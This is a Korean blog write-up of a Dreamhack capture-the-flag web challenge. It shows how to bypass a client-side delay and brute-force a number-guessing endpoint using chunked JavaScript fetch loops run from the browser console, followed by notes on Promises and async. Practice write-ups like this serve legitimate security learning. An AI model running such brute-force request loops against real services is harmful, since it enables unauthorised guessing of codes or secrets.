---
title: "[Level1]Test Your Luck"
categories: [Security, Web]
tags: [Dreamhack, Level1]
mermaid: true
---
### 문제 설명  
Test Your Luck~🍀  
숫자를 맞히고 플래그를 찾아주세요!  
플래그 형식은 DH{...} 입니다.  

### 풀이  
- 코드 분석 결과, 서버가 0~10000 사이의 숫자를 생성하고 사용자가 입력한 숫자와 비교하여 일치하면 플래그를 반환하는 구조  
- `index.html`을 보면, `<script>` 태그를 통해 요청을 보내고 10초간 대기하는 로직이 존재함  
    - 즉, 딜레이 코드는 서버에서 발생하는 것이 아니라 클라이언트 측에서 발생하는 것이므로, API 통신으로 직접 요청을 보내면 딜레이 없이 응답을 받아볼 수 있음  
- 또한 `index.html`을 보면, `fetch`를 통해 `/guess` 경로에 요청을 보내는 형태를 확인할 수 있음  
- 서버에서 생성한 숫자가 0~10000점, API 요청 시 딜레이 무시할 수 있다는 점을 토대로 브루트포싱으로 해결하는 문제라고 판단  

- `index.html`을 통해 API 요청 형태를 알 수 있음  
```html
<script>
    const response = await fetch('/guess', {
        method: 'POST',
        body: formData
    });
</script>
```
- `app.py`를 통해 `body`의 `key` 값이 `guess`임을 알 수 있음  
```python
@app.route('/guess', methods=['POST'])
def guess_number():
    user_guess = int(request.form['guess'])
    # ...
```

### 첫 시도  
- VSCode에서 Python으로 작성하여 진행하면 시간이 오래 걸리므로, 개발자 도구의 콘솔을 통해 직접 요청을 보내는 방식으로 진행  
```javascript
const url = "http://host8.dreamhack.games:port";
for (let i = 0; i < 10000; i++) {
    fetch(url + "/guess", {
        method: "POST",
        body: new URLSearchParams({ "guess": i })
    }).then(res => res.json())
    .then(data => {
        if (data.result != "Incorrect") {
            console.log(data.flag);
        }
    })
}
```
- 위 코드를 실행하면, 다음과 같은 에러가 발생함
!['에러 내용'](assets/img/Dreamhack/Web/Level1/Test-Your-Luck-failed.png)

### 두 번째 시도  
- 에러 내용을 확인해보니, 리소스가 부족하다는 의미였음  
- 이에 청크 단위로 요청을 보내도록 함  
```javascript
(async () => {
    const CHUNK = 100;
    let flag = false;
    for(let i=0; i<10000; i+=CHUNK) {
        if (flag) break;
        console.log(`[*] ${i}~${i+100-1}까지 처리 중...`);

        const promises = [];
        for(let j=i; j<i+CHUNK; j++){
            const promise = fetch(url + "/guess", {
                method: "POST",
                body: new URLSearchParams({"guess" : j})
            }).then(res => res.json())
            .then(data => {
                if (data.result !== "Incorrect") {
                    console.log(`%c 성공! Flag: ${data.flag}`);
                    flag = true;
                }
            });
            promises.push(promise);
        }
        await Promise.allSettled(promises);
    }
})();
```

### 새로 알게된 점  
- 자바스크립트는 기본적으로 한 번에 한 가지 일밖에 못하는 싱글스레드 언어임  
- **비동기 방식**은 이러한 싱글스레드의 한계를 극복하기 위해 사용되며, 특정 코드의 실행이 완료될 때까지 기다리지 않고 다음 코드를 실행할 수 있도록 함. 또한, 작업이 완료되면 그 결과를 처리할 수 있는 별도의 매커니즘(`Promise`)이 동작함  
- `Promise`는 비동기 작업의 최종 완료 또는 실패를 나타내는 객체
- `Promise.allSettled()`는 여러 개의 `Promise`를 동시에 실행하고, 모든 `Promise`가 완료될 때까지 기다린 후, 각 `Promise`의 결과를 배열로 반환함. 이 메서드는 모든 `Promise`가 성공하든 실패하든 상관없이 결과를 반환함  
- `async()`는 호출되면 항상 `Promise`를 반환하며, `await` 키워드를 사용하여 비동기 작업이 완료될 때까지 기다릴 수 있음. `async` 함수 내에서 `await`를 사용하면, 해당 작업이 완료될 때까지 다음 코드를 실행하지 않고 기다림  